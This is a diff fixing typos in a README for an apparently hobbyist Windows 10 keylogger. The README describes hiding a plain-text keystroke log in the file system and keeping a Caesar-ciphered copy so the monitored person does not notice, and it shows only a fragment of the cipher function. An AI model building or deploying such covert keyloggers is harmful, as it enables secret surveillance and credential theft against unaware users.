@@ -1,15 +1,15 @@
 Keylogger Encryption readme
 Synopsis:
-The program I have created is an Keylogger program. I created this prorgram to have a better understanding of how keyloggers work and I wanted to expand my knowledge on how to create one and see if I can make a much better one after this. This is a program that creates two files: One file is plain text and it is hidden somewhere in the computers directory file. The second file is located on the desktop and it is encrypted via ceaser cipher to make sure that the unsuspecting person does not know what it is you are recording. This way you can obtain the infomration you want from the user and prevent getting caught by the said user.
+The program I have created is an Keylogger program. I created this prorgram to have a better understanding of how Keyloggers work and I wanted to expand my knowledge on how to create one and see if I can make a much better one after this. This is a program that creates two files: One file is plain text and it is hidden somewhere in the computers directory file. The second file is located on the desktop and it is encrypted via Caeser cipher to make sure that the unsuspecting person does not know what it is you are recording. This way you can obtain the infomration you want from the user and prevent getting caught by the said user.
 
 
 Code Example:
-This code example below creates is designed for encrypting the file. The string CipherEncryption fucntion takes in a string that the user types in anywhere in the computer. Then the string is shifted by 13 key in the ceaser cipher for loop to encrypt the message. From there the string is returned to a string function called RegularAndEncryptedRecordings(string typedkeys). In that function the encrypted string is stored inside one of the files that takes in all encrypted files. 
+This code example below creates is designed for encrypting the file. The string CipherEncryption fucntion takes in a string that the user types in anywhere in the computer. Then the string is shifted by 13 key in the Caeser cipher for loop to encrypt the message. From there the string is returned to a string function called RegularAndEncryptedRecordings(string typedkeys). In that function the encrypted string is stored inside one of the files that takes in all encrypted files. 
 string CipherEncryption(char d, string typedkeys)
 {
 	int counter;
 	
-	// The ceaser cipher that encrypts the messages for OutScam
+	// The Caeser cipher that encrypts the messages for OutScam
 	
 	for (counter = 0; counter < typedkeys.length(); counter++)
 	{
@@ -302,7 +302,7 @@ string RegularAndEncryptedRecordings(string typedkeys)
 }
 
 Motivation:
-The motivation for this project is to have white hat hackers, and software developers to gain ideas from the indie programmer community to help prevent virus from infecting computers. Also this program is for pentration testers and any software developers looking to create better defenses for computing systems.
+The motivation for this project is to have white hat hackers, and software developers to gain ideas from the indie programmer community to help prevent virus from infecting computers. Also this program is for penetration testers and any software developers looking to create better defenses for computing systems.
 
 Installation:
 The program requires a windows 10 based enviroment in order to work. The reason being is that the SDK's do not work well outside of a windows 10 enviroment. So in order to avoid any problems using the software make sure it is running in a windows 10 enviroment. The program itself is not backwards compatable and it does not work on any other operating system but Windows 10. 
